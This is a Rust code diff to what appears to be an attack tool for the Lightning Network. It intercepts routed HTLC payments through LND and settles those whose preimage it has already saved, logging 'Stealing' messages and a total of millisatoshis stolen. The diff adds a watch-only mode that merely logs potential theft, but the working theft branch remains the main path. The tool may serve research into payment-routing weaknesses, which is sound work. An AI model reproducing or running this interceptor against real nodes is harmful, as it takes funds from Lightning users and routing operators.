@@ -55,7 +55,11 @@ enum InterceptorAction {
     Resume = 2,
 }
 
-pub async fn start_htlc_interceptor(lnd: LndRouterClient, storage: Arc<Mutex<dyn Storage + Send>>) {
+pub async fn start_htlc_interceptor(
+    lnd: LndRouterClient,
+    storage: Arc<Mutex<dyn Storage + Send>>,
+    watch_only: bool,
+) {
     let mut router = lnd.clone();
     let (tx, rx) = tokio::sync::mpsc::channel::<
         tonic_openssl_lnd::routerrpc::ForwardHtlcInterceptResponse,
@@ -80,17 +84,33 @@ pub async fn start_htlc_interceptor(lnd: LndRouterClient, storage: Arc<Mutex<dyn
         let response = match db.get(htlc.payment_hash) {
             Some(preimage) => {
                 let steal_amt = htlc.incoming_amount_msat;
-                println!("HTLC preimage saved! Stealing {steal_amt} msats...");
+                // if in watch only mode, only log, do not settle htlc
+                if watch_only {
+                    println!("HTLC preimage saved! Could have stolen {steal_amt} msats...");
 
-                let total = db.add_stolen(steal_amt);
-                println!("New total amount stolen: {total} msats");
+                    let total = db.add_stolen_watch_only(steal_amt);
+                    println!("New total potential amount stolen: {total} msats");
 
-                tonic_openssl_lnd::routerrpc::ForwardHtlcInterceptResponse {
-                    incoming_circuit_key: htlc.incoming_circuit_key,
-                    action: InterceptorAction::Settle as i32,
-                    preimage: preimage.to_vec(),
-                    failure_code: 0,
-                    failure_message: vec![],
+                    tonic_openssl_lnd::routerrpc::ForwardHtlcInterceptResponse {
+                        incoming_circuit_key: htlc.incoming_circuit_key,
+                        action: InterceptorAction::Resume as i32,
+                        preimage: vec![],
+                        failure_code: 0,
+                        failure_message: vec![],
+                    }
+                } else {
+                    println!("HTLC preimage saved! Stealing {steal_amt} msats...");
+
+                    let total = db.add_stolen(steal_amt);
+                    println!("New total amount stolen: {total} msats");
+
+                    tonic_openssl_lnd::routerrpc::ForwardHtlcInterceptResponse {
+                        incoming_circuit_key: htlc.incoming_circuit_key,
+                        action: InterceptorAction::Settle as i32,
+                        preimage: preimage.to_vec(),
+                        failure_code: 0,
+                        failure_message: vec![],
+                    }
                 }
             }
             None => {
